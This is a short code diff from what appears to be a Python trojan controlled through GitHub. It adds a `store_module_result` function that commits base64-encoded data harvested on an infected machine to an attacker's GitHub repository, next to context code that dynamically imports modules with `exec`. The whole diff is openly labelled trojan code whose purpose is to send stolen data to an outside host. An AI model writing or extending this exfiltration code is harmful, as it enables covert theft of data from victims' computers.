@@ -40,3 +40,9 @@ def get_trojan_config():
         if task['module'] not in sys.modules:
             exec("import %s" % task['module'])
     return config
+
+def store_module_result(data):
+    gh,repo,branch=connect_to_github()
+    remote_path="data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
+    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
+    return
